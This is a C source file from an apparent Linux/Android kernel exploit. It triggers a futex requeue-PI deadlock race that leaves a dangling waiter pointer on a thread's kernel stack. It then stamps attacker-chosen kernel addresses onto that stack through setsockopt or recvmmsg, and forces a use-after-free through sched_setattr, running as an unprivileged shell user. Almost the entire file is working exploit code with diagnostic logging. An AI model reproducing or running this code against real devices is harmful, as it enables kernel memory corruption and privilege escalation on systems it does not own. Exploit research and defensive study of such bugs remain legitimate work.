#define _GNU_SOURCE
#include "target.h"
#include "common.h"

#include <ctype.h>
#include <errno.h>
#include <linux/futex.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <signal.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sched.h>
#include <time.h>

/* ── EXP32_STAMP_OFF runtime override for calibration ── */
static size_t get_stamp_offset(void)
{
    const char *env = getenv("EXP32_STAMP_OFF");
    if (env) {
        char *end = NULL;
        unsigned long val = strtoul(env, &end, 0);
        if (end != env && val < 256 && toupper(*end) == 'X') {
            return (size_t)val;
        } else if (end != env && val < 256) {
            return (size_t)val;
        }
    }
    return 0x58;
}

#define WAITER_WAIT_SEC 5

/* 3 futex variables for proper deadlock setup */
static uint32_t f_wait;
static uint32_t f_pi_target;
static uint32_t f_pi_chain;

struct race_ctx {
    int sockfd;
    volatile int waiter_ready;
    volatile int waiter_waiting;
    volatile int owner_started;
    volatile int a_sprayed;
    volatile int walk_done;
    volatile pid_t tid_a;
    volatile int cmp_requeued;
    volatile int edealdk_confirmed;
    volatile int waiter_return_errno;
    volatile int waiter_timed_out;
    volatile int waiter_unlocked_before_stamp;
    volatile int stamp_entered;
    volatile int stamp_completed;
    volatile int release_requested;
    volatile int release_signal_errno;
    uint64_t t_begin_ms;
    uint64_t t_wait_enter_ms;
    uint64_t t_cmp_call_ms;
    uint64_t t_cmp_return_ms;
    uint64_t t_release_ms;
    uint64_t t_wait_return_ms;
    uint64_t t_unlock_ms;
    uint64_t t_stamp_enter_ms;
    uint64_t t_stamp_done_ms;
    uint64_t t_consumer_walk_ms;
    uint64_t t_walk_done_ms;
};

static struct race_ctx g_ctx;
static pthread_t g_thread_waiter;
static pthread_t g_thread_owner;
static pthread_t g_thread_consumer;

static void sigusr1_handler(int sig)
{
    (void)sig;
}

#define LOG(fmt, ...) \
    do { \
        printf("[race] " fmt "\n", ##__VA_ARGS__); \
        fflush(stdout); \
    } while (0)

static uint64_t now_ms(void)
{
    struct timespec ts;
    if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0) {
        return 0;
    }
    return (uint64_t)ts.tv_sec * 1000ULL + (uint64_t)ts.tv_nsec / 1000000ULL;
}

static uint64_t rel_ms(const struct race_ctx *ctx, uint64_t t)
{
    if (!ctx || !ctx->t_begin_ms || !t || t < ctx->t_begin_ms) {
        return 0;
    }
    return t - ctx->t_begin_ms;
}

static void log_syscall(const char *name, long ret, int saved_errno)
{
    if (ret < 0) {
        LOG("%s -> ret=%ld errno=%d (%s)",
            name, ret, saved_errno, strerror(saved_errno));
    } else {
        LOG("%s -> ret=%ld", name, ret);
    }
}

/*
 * Thread A (waiter): Create the stale waiter on its kernel stack
 * 1. Lock f_pi_chain (become PI owner)
 * 2. Wait on f_wait with requeue to f_pi_target
 * 3. Build spray buffer on stack
 * 4. Call recvmmsg() which blocks forever
 */
static void *waiter_thread(void *arg)
{
    struct race_ctx *ctx = (struct race_ctx *)arg;

    ctx->tid_a = (pid_t)syscall(SYS_gettid);
    LOG("waiter_thread TID=%d", ctx->tid_a);

    /* Step 1: Lock pi_chain (become PI owner) */
    errno = 0;
    long r0 = syscall(SYS_futex, &f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    log_syscall("WAITER: LOCK_PI(pi_chain)", r0, errno);
    if (r0 != 0) {
        LOG("WAITER: Failed to lock pi_chain");
        return NULL;
    }

    ctx->waiter_ready = 1;
    LOG("WAITER: waiter_ready=1");

    /* Wait for owner to start */
    while (!ctx->owner_started) {
        usleep(1000);
    }
    LOG("WAITER: owner_started=1");

    /* FUTEX_WAIT_REQUEUE_PI takes an absolute monotonic deadline. */
    struct timespec ts;
    if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0) {
        LOG("WAITER: clock_gettime(CLOCK_MONOTONIC) failed errno=%d", errno);
        errno = 0;
        syscall(SYS_futex, &f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        return NULL;
    }
    ts.tv_sec += WAITER_WAIT_SEC;

    ctx->waiter_waiting = 1;
    ctx->t_wait_enter_ms = now_ms();
    LOG("WAITER: FUTEX_WAIT_REQUEUE_PI(f_wait -> f_pi_target)");

    errno = 0;
    long r = syscall(SYS_futex, &f_wait, FUTEX_WAIT_REQUEUE_PI, 0,
                     &ts, &f_pi_target, 0);
    ctx->t_wait_return_ms = now_ms();
    int wait_errno = (r < 0) ? errno : 0;
    ctx->waiter_return_errno = wait_errno;
    log_syscall("WAITER: FUTEX_WAIT_REQUEUE_PI", r, wait_errno);

    /* If we get here via timeout, unlock pi_chain */
    if (wait_errno == ETIMEDOUT) {
        ctx->waiter_timed_out = 1;
        LOG("WAITER: timeout detected, unlocking pi_chain");
        errno = 0;
        ctx->waiter_unlocked_before_stamp = 1;
        long r2 = syscall(SYS_futex, &f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        ctx->t_unlock_ms = now_ms();
        log_syscall("WAITER: UNLOCK_PI(pi_chain)", r2, errno);
    } else {
        LOG("WAITER: non-timeout return, preserving pi_chain for stamp diagnostics");
    }

    /* Step 4: Stamp kernel stack */
#ifdef USE_MCAST_STAMP
    /* Native 64-bit IPv4 MCAST stamp */
    unsigned char gsr[MCAST_BUFFER_SIZE_64];
    memset(gsr, 0, sizeof(gsr));

    /* Setup valid group and source sockaddr_in structures so setsockopt proceeds to copy */
    struct sockaddr_in *sin_grp = (struct sockaddr_in *)&gsr[8];
    sin_grp->sin_family = AF_INET;
    sin_grp->sin_addr.s_addr = inet_addr("239.255.0.1");

    struct sockaddr_in *sin_src = (struct sockaddr_in *)&gsr[0x88];
    sin_src->sin_family = AF_INET;
    sin_src->sin_addr.s_addr = inet_addr("192.0.2.1");

    /*
     * Waiter base lands at gsr + MCAST_64_WAITER_BASE_OFF (0xc8)
     * Waiter task (Word 6, +0x30) lands at gsr + MCAST_64_TASK_OFF (0xf8)
     * Waiter lock (Word 7, +0x38) lands at gsr + MCAST_64_LOCK_OFF (0x100)
     */
    uint64_t v_task = ADDR_INIT_TASK;
#ifdef X216B_TASK_PROBE
    v_task = 0xdeadbeefcafebabeULL;
    LOG("STACK_PROBE: waiter->task marker=0x%016llx", (unsigned long long)v_task);
#endif

    uint64_t v_lock = ADDR_VERIFIED_VLOCK;
#ifdef X216B_LOCK_PROBE
    v_lock = 0xdeadbeefcafebabeULL;
    LOG("STACK_PROBE: waiter->lock marker=0x%016llx", (unsigned long long)v_lock);
#endif

    memcpy(&gsr[MCAST_64_TASK_OFF], &v_task, sizeof(uint64_t));
    memcpy(&gsr[MCAST_64_LOCK_OFF], &v_lock, sizeof(uint64_t));

    ctx->a_sprayed = 1;
    ctx->stamp_entered = 1;
    ctx->t_stamp_enter_ms = now_ms();
    LOG("WAITER: entering IPv4 MCAST_BLOCK_SOURCE stamp (task=0x%llx lock=0x%llx)",
        (unsigned long long)v_task, (unsigned long long)v_lock);
    errno = 0;
    (void)setsockopt(ctx->sockfd, IPPROTO_IP, MCAST_BLOCK_SOURCE,
                     gsr, (socklen_t)sizeof(gsr));
    /* Do not log or issue a syscall on this thread before the consumer */
    ctx->stamp_completed = 1;
    ctx->t_stamp_done_ms = now_ms();
    ctx->a_sprayed = 2;
    LOG("WAITER: stamp completed");
    while (!ctx->walk_done) {
        __asm__ __volatile__("yield" ::: "memory");
    }
    return NULL;
#else
    /* do_recvmmsg fallback path */
    char buf[56];
    memset(buf, 0, sizeof(buf));

    uint64_t v_task_fb = ADDR_INIT_TASK;
    uint64_t v_lock_fb = ADDR_VERIFIED_VLOCK;
    uint32_t v_prio = 120;

    memcpy(buf + 0x20, &v_task_fb, 8);
    memcpy(buf + 0x28, &v_lock_fb, 8);
    memcpy(buf + 0x30, &v_prio, 4);

    struct { uint8_t hdr[56]; uint32_t len; } __attribute__((packed)) mmsg;
    memcpy(mmsg.hdr, buf, 56);
    mmsg.len = 0;

    ctx->a_sprayed = 1;
    ctx->stamp_entered = 1;
    ctx->t_stamp_enter_ms = now_ms();
    LOG("WAITER: a_sprayed=1, entering recvmmsg()");

    /* Call recvmmsg - blocks forever, holding the stack */
    syscall(SYS_recvmmsg, ctx->sockfd, &mmsg, 1, 0, NULL);
    ctx->stamp_completed = 1;
    ctx->t_stamp_done_ms = now_ms();

    while (!ctx->walk_done) {
        __asm__ __volatile__("yield" ::: "memory");
    }

    while (1) pause();
    return NULL;
#endif
}

/*
 * Thread B (owner): Lock the chain to set up the deadlock
 */
static void *owner_thread(void *arg)
{
    struct race_ctx *ctx = (struct race_ctx *)arg;

    /* Lock pi_target first */
    errno = 0;
    long r0 = syscall(SYS_futex, &f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    log_syscall("OWNER: LOCK_PI(pi_target)", r0, errno);
    if (r0 != 0) {
        LOG("OWNER: Failed to lock pi_target");
        return NULL;
    }

    LOG("OWNER: waiting for waiter_ready...");
    while (!ctx->waiter_ready) {
        usleep(1000);
    }
    LOG("OWNER: waiter_ready=1");

    ctx->owner_started = 1;
    LOG("OWNER: owner_started=1");

    /* Try to lock pi_chain - blocks because waiter holds it */
    LOG("OWNER: LOCK_PI(pi_chain) -- will block");
    errno = 0;
    long r = syscall(SYS_futex, &f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    log_syscall("OWNER: LOCK_PI(pi_chain)", r, errno);

    while (1) pause();
    return NULL;
}

/*
 * Thread C (consumer): Trigger the deadlock and walk
 *
 * The CMP_REQUEUE_PI MUST be called from the MAIN thread (or BEFORE
 * consumer starts its main work), because:
 * - CMP_REQUEUE_PI triggers the PI chain walk via rt_mutex_start_proxy_lock
 * - This cleans the wrong waiter's pi_blocked_on (main's, not waiter's)
 * - The waiter's pi_blocked_on stays dangling, pointing to its kernel stack
 * - When consumer later triggers sched_setattr, the pi_chain walk uses
 *   the dangling waiter, causing the use-after-free via rb_erase_cached
 *
 * The consumer thread's job is to trigger sched_setattr on the waiter
 * AFTER the exploit payload has been stamped on the stack.
 */
static void *consumer_thread(void *arg)
{
    struct race_ctx *ctx = (struct race_ctx *)arg;

    while (!ctx->a_sprayed) {
        usleep(1000);
    }

    /* Wait for CMP_REQUEUE_PI to have been called (by trigger_futex_race) */
    usleep(500000);

    /* Trigger consumer walk via sched_setattr */
    LOG("CONSUMER: sched_setattr(tid_a=%d)", ctx->tid_a);
    ctx->t_consumer_walk_ms = now_ms();

    struct sched_attr {
        uint32_t size;
        uint32_t sched_policy;
        uint64_t sched_flags;
        int32_t  sched_nice;
        uint32_t sched_priority;
        uint64_t sched_runtime;
        uint64_t sched_deadline;
        uint64_t sched_period;
    } attr;

    memset(&attr, 0, sizeof(attr));
    attr.size = sizeof(attr);
    /*
     * Use SCHED_BATCH (policy 3) with a positive nice value.
     * SCHED_FIFO (policy 1) requires CAP_SYS_NICE and fails with EPERM (errno 1)
     * when running as unprivileged UID 2000 (AID_SHELL).
     * Changing nice on a thread within the same process is permitted without privileges.
     */
    attr.sched_policy = 3;  /* SCHED_BATCH */
    attr.sched_nice = 5;

    errno = 0;
    long pr = syscall(SYS_sched_setattr, ctx->tid_a, &attr, 0);
    log_syscall("CONSUMER: sched_setattr", pr, errno);

    ctx->walk_done = 1;
    ctx->t_walk_done_ms = now_ms();

    while (1) pause();
    return NULL;
}

int trigger_futex_race(void)
{
    memset(&g_ctx, 0, sizeof(g_ctx));
    g_ctx.t_begin_ms = now_ms();

    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = sigusr1_handler;
    sigemptyset(&sa.sa_mask);
    if (sigaction(SIGUSR1, &sa, NULL) != 0) {
        LOG("sigaction(SIGUSR1) failed errno=%d", errno);
        return -1;
    }

    LOG("=== trigger_futex_race BEGIN ===");

    /* Create socket for recvmmsg */
    g_ctx.sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (g_ctx.sockfd < 0) {
        LOG("socket failed errno=%d", errno);
        return -1;
    }

    /* Bind to a local port */
    struct sockaddr_in addr = { .sin_family = AF_INET, .sin_port = 0 };
    addr.sin_addr.s_addr = htonl(0x7f000001);
    if (bind(g_ctx.sockfd, (const struct sockaddr *)&addr, sizeof(addr)) < 0) {
        LOG("bind failed errno=%d", errno);
        close(g_ctx.sockfd);
        return -1;
    }

    /* Create waiter thread */
    if (pthread_create(&g_thread_waiter, NULL, waiter_thread, &g_ctx) != 0) {
        LOG("pthread_create(WAITER) failed");
        return -1;
    }

    /* Create owner thread */
    if (pthread_create(&g_thread_owner, NULL, owner_thread, &g_ctx) != 0) {
        LOG("pthread_create(OWNER) failed");
        return -1;
    }

    /* Create consumer thread */
    if (pthread_create(&g_thread_consumer, NULL, consumer_thread, &g_ctx) != 0) {
        LOG("pthread_create(CONSUMER) failed");
        return -1;
    }

    /* Wait for waiter and owner to be ready */
    for (int i = 0; i < 5000 && !g_ctx.waiter_ready; i++) usleep(1000);
    for (int i = 0; i < 5000 && !g_ctx.owner_started; i++) usleep(1000);
    LOG("PHASE1: setup waiter_ready=%d owner_started=%d",
        g_ctx.waiter_ready, g_ctx.owner_started);
    usleep(1000000);

    /* Wait for waiter to be inside FUTEX_WAIT_REQUEUE_PI */
    for (int i = 0; i < 5000 && !g_ctx.waiter_waiting; i++) usleep(1000);
    LOG("PHASE1: waiter_waiting=%d", g_ctx.waiter_waiting);

    /* Give the scheduler a moment to settle */
    usleep(200000);

    /* Trigger the deadlock -- CMP_REQUEUE_PI with val=1
       This must be called AFTER:
       - waiter is in FUTEX_WAIT_REQUEUE_PI (waiting for requeue)
       - owner has started (blocked on pi_chain)

       The waiter's pi_blocked_on points to its kernel stack waiter struct.
       CMP_REQUEUE_PI cleans main's pi_blocked_on, NOT waiter's.
       This leaves waiter's pi_blocked_on dangling to its stack. */
    LOG("=== TRIGGERING CMP_REQUEUE_PI ===");
    g_ctx.t_cmp_call_ms = now_ms();
    errno = 0;
    long rr = syscall(SYS_futex, &f_wait, FUTEX_CMP_REQUEUE_PI, 1,
                      (void *)1, &f_pi_target, 0);
    g_ctx.t_cmp_return_ms = now_ms();
    int r_errno = errno;
    log_syscall("CMP_REQUEUE_PI", rr, r_errno);

    if (r_errno == 35) {  /* EDEADLK - deadlock detected */
        g_ctx.edealdk_confirmed = 1;
        LOG("CMP_REQUEUE_PI: EDEADLK confirmed");
        LOG("PHASE1: releasing waiter for stack stamp");
        f_wait = 1;
        __atomic_thread_fence(__ATOMIC_SEQ_CST);
        g_ctx.release_requested = 1;
        g_ctx.t_release_ms = now_ms();
        errno = 0;
        long sigret = syscall(SYS_tgkill, getpid(), g_ctx.tid_a, SIGUSR1);
        g_ctx.release_signal_errno = (sigret < 0) ? errno : 0;
        if (sigret < 0) {
            log_syscall("PHASE1: tgkill(SIGUSR1)", sigret, g_ctx.release_signal_errno);
        }
    } else if (r_errno != 0) {
        LOG("CMP_REQUEUE_PI error errno=%d", r_errno);
    } else {
        LOG("CMP_REQUEUE_PI returned 0");
    }

    g_ctx.cmp_requeued = 1;

    /* Wait for spray */
    for (int i = 0; i < 10000 && !g_ctx.a_sprayed; i++) usleep(1000);

    /* Wait for consumer to complete its work */
    for (int i = 0; i < 5000 && !g_ctx.walk_done; i++) usleep(1000);

    int reference_order_ok =
        g_ctx.edealdk_confirmed &&
        !g_ctx.waiter_timed_out &&
        !g_ctx.waiter_unlocked_before_stamp &&
        g_ctx.stamp_completed &&
        g_ctx.walk_done &&
        g_ctx.t_stamp_done_ms &&
        g_ctx.t_consumer_walk_ms &&
        g_ctx.t_stamp_done_ms <= g_ctx.t_consumer_walk_ms;

    LOG("PHASE1: edealdk=%d waiter_errno=%d timed_out=%d stamp_completed=%d "
        "walk_done=%d reference_order_ok=%d",
        g_ctx.edealdk_confirmed, g_ctx.waiter_return_errno,
        g_ctx.waiter_timed_out, g_ctx.stamp_completed,
        g_ctx.walk_done, reference_order_ok);

    if (g_ctx.t_wait_return_ms && g_ctx.t_cmp_return_ms &&
        g_ctx.t_wait_return_ms >= g_ctx.t_cmp_return_ms) {
        LOG("PHASE1: cmp_to_wait_return_delta=%llums",
            (unsigned long long)(g_ctx.t_wait_return_ms - g_ctx.t_cmp_return_ms));
    }

    if (!g_ctx.edealdk_confirmed) {
        LOG("PHASE1: classification=no-edeadlk");
    } else if (g_ctx.waiter_timed_out || g_ctx.waiter_unlocked_before_stamp) {
        LOG("PHASE1: classification=timeout-before-stamp");
        LOG("PHASE1: result=FAIL no controlled write evidence");
    } else if (!g_ctx.stamp_completed) {
        LOG("PHASE1: classification=no-stamp-completion");
        LOG("PHASE1: result=FAIL no controlled write evidence");
    } else if (!g_ctx.walk_done) {
        LOG("PHASE1: classification=stamp-without-consumer-walk");
        LOG("PHASE1: result=FAIL no controlled write evidence");
    } else if (!reference_order_ok) {
        LOG("PHASE1: classification=ordering-mismatch");
        LOG("PHASE1: result=FAIL stamp/walk order does not match reference");
    } else {
        LOG("PHASE1: classification=reference-order-ok");
        LOG("PHASE1: result=NEEDS_PHASE2_PROOF bridge/marker not confirmed");
    }

    LOG("=== trigger_futex_race END ===");

    /*
     * Adopt iQOO / RMG pattern:
     * Do NOT pthread_join the background threads. Joining blocks indefinitely
     * because the worker threads must remain alive to hold kernel locks and
     * preserve stale slab structures without triggering do_exit() cleanup.
     */
    if (!g_ctx.edealdk_confirmed ||
        g_ctx.waiter_timed_out ||
        g_ctx.waiter_unlocked_before_stamp ||
        !g_ctx.stamp_completed ||
        !g_ctx.walk_done ||
        !reference_order_ok) {
        return 1;
    }
    return 2;
}

int trigger_walk(void)
{
    return 0;
}
